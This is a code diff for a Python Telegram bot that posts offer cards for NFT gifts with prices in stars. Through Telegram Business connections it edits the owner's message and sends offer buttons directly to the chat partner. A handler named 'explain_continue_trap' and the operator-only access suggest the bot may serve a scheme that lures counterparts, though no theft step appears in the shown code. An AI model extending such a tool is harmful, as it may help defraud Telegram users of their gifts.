@@ -396,7 +396,7 @@ async def process_broadcast(message: Message, state: FSMContext):
 async def execute_ar_command(message: Message, is_business: bool = False):
     user_id = message.from_user.id
     register_user(user_id)
-    
+
     if not is_authorized(user_id):
         await message.answer("❌ У вас нет доступа к использованию этого бота.")
         return
@@ -404,7 +404,7 @@ async def execute_ar_command(message: Message, is_business: bool = False):
     text = message.text or ""
     args_text = text[3:].strip()
     raw_args = args_text or "MirageLamp-44307 2727 stars"
-    
+
     slug, price_display, _ = parse_query_and_price(raw_args)
     biz_conn_id = message.business_connection_id if is_business else None
     data = await fetch_real_nft_data(slug)
@@ -416,26 +416,47 @@ async def execute_ar_command(message: Message, is_business: bool = False):
         show_above_text=True
     )
 
+    card_text = format_parsed_card(data, price_display)
+
+    if biz_conn_id:
+        # 1) Редактируем исходное /ar: карточка видна ОБОИМ,
+        #    но кнопки в business-сообщении Telegram показывает только владельцу.
+        try:
+            await bot.edit_message_text(
+                chat_id=message.chat.id,
+                message_id=message.message_id,
+                business_connection_id=biz_conn_id,
+                text=card_text,
+                parse_mode="HTML",
+                link_preview_options=preview_opts,
+                reply_markup=get_step1_kb()
+            )
+        except Exception as e:
+            print(f"Ошибка редактирования: {e}")
+
+        # 2) Дублируем кнопки КЛИЕНТУ напрямую от бота.
+        #    В business-контексте message.chat.id = user_id собеседника (клиента).
+        try:
+            await bot.send_message(
+                chat_id=message.chat.id,
+                text="👇 <b>Выберите действие по офферу:</b>",
+                parse_mode="HTML",
+                reply_markup=get_step1_kb()
+            )
+        except Exception as e:
+            print(f"Не удалось отправить кнопки клиенту (возможно, не запускал бота): {e}")
+        return
+
+    # Обычный (не business) режим
     try:
-        # Всегда отправляем новое сообщение с кнопками, чтобы собеседник их видел
         await bot.send_message(
             chat_id=message.chat.id,
-            business_connection_id=biz_conn_id,
-            text=format_parsed_card(data, price_display),
+            text=card_text,
             parse_mode="HTML",
             link_preview_options=preview_opts,
             reply_markup=get_step1_kb()
         )
-        
-        # Удаляем сообщение с командой /ar
-        if biz_conn_id:
-            await bot.delete_business_messages(
-                business_connection_id=biz_conn_id,
-                message_ids=[message.message_id]
-            )
-        else:
-            await message.delete()
-            
+        await message.delete()
     except Exception as e:
         print(f"Ошибка отправки карточки: {e}")
 
@@ -466,11 +487,15 @@ async def explain_continue_trap(callback: CallbackQuery):
 
 @dp.callback_query(F.data == "decline_offer")
 async def process_decline(callback: CallbackQuery):
-    declined_text = "❌ <b>Предложение отклонено владельцем</b>"
+    declined_text = "❌ <b>Предложение отклонено</b>"
     if callback.message:
         await callback.message.edit_text(text=declined_text, parse_mode="HTML")
     elif callback.inline_message_id:
-        await bot.edit_message_text(inline_message_id=callback.inline_message_id, text=declined_text, parse_mode="HTML")
+        await bot.edit_message_text(
+            inline_message_id=callback.inline_message_id,
+            text=declined_text,
+            parse_mode="HTML"
+        )
     await callback.answer("Оффер отклонен")
 
 async def main():
